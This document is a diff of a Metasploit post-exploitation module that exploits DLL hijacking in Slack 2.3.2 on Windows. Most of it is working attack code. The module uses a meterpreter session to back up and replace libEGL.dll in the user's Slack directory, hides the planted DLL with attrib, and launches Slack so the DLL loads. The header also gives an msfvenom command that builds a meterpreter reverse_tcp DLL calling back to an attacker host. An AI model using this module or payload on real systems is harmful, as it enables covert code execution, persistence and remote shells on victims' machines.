@@ -9,36 +9,25 @@
 ##
 # Exploit Title  : slack_dll_hijack.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
-# slack Version  : 2.3.2
-# vuln Discover  : Chaitanya Haritash
-# Tested on      : Windows 7 ultimate (32 bites)
+# Slack Version  : 2.3.2
+# Vuln Discover  : Chaitanya Haritash
+# Tested on      : Windows 7 ultimate (32 bits)
 # Software Link  : http://www.techspot.com/downloads/6754-slack.html
 #
 #
-# [ SOFTWARE DETAILS ]
-# slack 2.3.2 - Real-time messaging that works. Get full access to your messages and archives,
-# upload files easily, and receive notifications whether you’re at your desk or on the go.
-# slack 2.3.2 its affected by dll hijacking method.
-#
-# [ ATTACK DETAILS ]
-# Depending on the configuration of the system, a program can decide the order of the directories
-# to be searched for a DLL to load. By default the order of this search is as follows:
-#
-# 1 - The directory from which the application is loaded
-# 2 - The current directory
-# 3 - The system directory, usually C:\\Windows\\System32\\
-# 4 - The 16-bit system directory - There is no dedicated function to retrieve the path of this directory.
-# 5 - The Windows directory. The GetWindowsDirector function is called to obtain this directory.
-# 6 - The directories that are listed in the PATH environment variable.
-#
-# In this case, the current directory is the problem. When a program makes a decision
-# to load a DLL from the current directory, it can lead to the DLL hijacking. To exploit
-# this vulnerability a local attacker can insert an executable file in the path of the service.
+# [ VULNERABILITY DETAILS ]
+# DLL Hijacking is when you abuse the library search order to gain execution in a process.
+# Being able to write to the directory an executable it allows a malicious actor the ability
+# to drop a dll with the same name as one the executable will request via LoadLibrary. When
+# executable attempts to load the expected library, it will instead load the malicious dll.
+# "In this case the current install directory and PATH environment (%LOCALAPPDATA%) are the
+# problems. When a program makes the decision to load a DLL from the current directory, it
+# can lead to DLL hijacking, in this example expoited remotelly"...
 #
 #
-# [ BUILD MALICIOUS DLL ]
+#
+# [ BUILD MALICIOUS DLL FOR TESTING ]
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o libEGL.dll
-#
 #
 # [ MODULE DEFAULT OPTIONS ]
 # The session number to run this module on        => set SESSION 3
@@ -95,7 +84,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'dll hijacking in slack 2.3.2 software',
                         'Description'   => %q{
-                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our libEGL.dll malicious agent into the path of the service (dll hijacking) "WARNING: payload to send must be named as: libEGL.dll"
+                                        This post-exploitation module requires a meterpreter session to be able to upload our malicious libEGL.dll agent into slack 2.3.2 working directory. When slack.exe attempts to load the expected library, it will instead load the malicious dll. "WARNING: payload to send must be named as: libEGL.dll"
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -104,8 +93,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : Chaitanya Haritash', # vuln discover
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
-                        'DisclosureDate' => 'dez 1 2016',
+                        'Version'        => '$Revision: 1.3',
+                        'DisclosureDate' => 'dez 2 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -114,7 +103,7 @@ class MetasploitModule < Msf::Post
                                          # tested on: windows 7 ultimate (32 bits)
                                          [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '3', # default its to run againts windows 7 ultimate (32 bits)
+                        'DefaultTarget'  => '3', # default its to run againts windows 7
                         'References'     =>
                                 [
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
@@ -145,8 +134,6 @@ class MetasploitModule < Msf::Post
 
 
 
-
-
 # --------------------------------------------
 # UPLOAD OUR MALICIOUS DLL INTO TARGET SYSYTEM
 # --------------------------------------------
@@ -165,15 +152,15 @@ def ls_stage1
     print_warning("Please set LOCAL_PATH option!")
     return nil
   else
-    print_status("Deploying malicious dll into target system!")
+    print_status("Exploiting dll hijacking in slack 2.3.2!")
     sleep(1.5)
   end
 
     # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
-      print_warning(" Vulnerable dll agent: #{p_name} found...")
+      print_warning("Vulnerable dll agent: #{p_name} found...")
       # backup original dll using cmd.exe COPY command...
-      print_good(" Backup original dll...")
+      print_good(" Backup original slack software dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_path}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
 
@@ -181,23 +168,23 @@ def ls_stage1
       print_good(" Uploading: #{p_name} malicious agent...")
       client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
       sleep(1.0)
-      print_good(" Uploaded : #{u_path} -> #{d_path}\\#{p_name}")
+      print_good(" Uploaded : #{d_path}\\#{p_name}")
       sleep(1.0)
 
         # change attributes of libEGL.dll to hidde it from site...
-        print_good(" Use attrib command to hidde dll...")
+        print_good(" Use attrib command to hidde malicious dll...")
         r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
-        print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
+        print_good(" attrib +h +s #{d_path}\\#{p_name}")
         sleep(1.0)
 
           # start remote malicious service
-          print_status("Sart remote service...")
-          r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
+          print_status("Start slack 2.3.2 service remotelly...")
+          r = session.sys.process.execute("cmd.exe /c start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
         # task completed successefully...
         print_status("Malicious dll placed successefuly...")
-        print_status("Sart one handler and wait for connection!")
+        print_status("If you have set a handler befor... congratz!")
         print_line("")
 
       # close channel when done
@@ -205,8 +192,8 @@ def ls_stage1
       r.close
 
     else
-      print_error("ABORT: post-module cant find original dll...")
-      print_error("original dll: #{d_path}\\#{p_name}")
+      print_error("[ ABORT ]: post-module cant find original dll...")
+      print_error("slack_dll: #{d_path}\\#{p_name}")
       print_line("")
     end
 
@@ -218,8 +205,6 @@ end
 
 
 
-
-
 # --------------------------------------
 # REVERT MALICIOUS DLL TO ORIGINAL STATE
 # --------------------------------------
@@ -227,9 +212,8 @@ def ls_stage2
 
   r=''
   session = client
-  s_name = "slack.exe"                        # service executable
   p_name = "libEGL.dll"                       # malicious libEGL.dll
-  b_name = "libEGL.bk"                        # service executable
+  b_name = "libEGL.bk"                        # libEGL.dll remote backup
   d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -238,7 +222,7 @@ def ls_stage2
     print_warning("Please set REVERT_HIJACK option!")
     return nil
   else
-    print_status("Deleting malicious dll!")
+    print_status("Detecting remote malicious dll.")
     sleep(1.5)
   end
 
@@ -254,7 +238,8 @@ def ls_stage2
       print_good(" Revert slack dll to default stage...")
       r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_path}\\#{b_name} #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
-      print_status("slack dll reverted to default stage...")
+      print_status("dll hijacking in slack 2.3.2 reverted...")
+      print_warning("we have lost our shell, but feeded the white hacker within...")
       print_line("")
 
     # close channel when done
@@ -262,8 +247,8 @@ def ls_stage2
     r.close
 
     else
-      print_error("ABORT: post-module cant find backup dll...")
-      print_error("backup dll: #{d_path}\\#{b_name}")
+      print_error("[ ABORT ]: post-module cant find backup dll...")
+      print_error("backup_dll: #{d_path}\\#{b_name}")
       print_line("")
     end
 
@@ -309,7 +294,7 @@ def run
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("ABORT]:This post-module only works in meterpreter sessions")
+      print_error("[ ABORT ]:This post-module only works in meterpreter sessions")
       raise Rex::Script::Completed
     end
     # elevate session privileges befor runing options
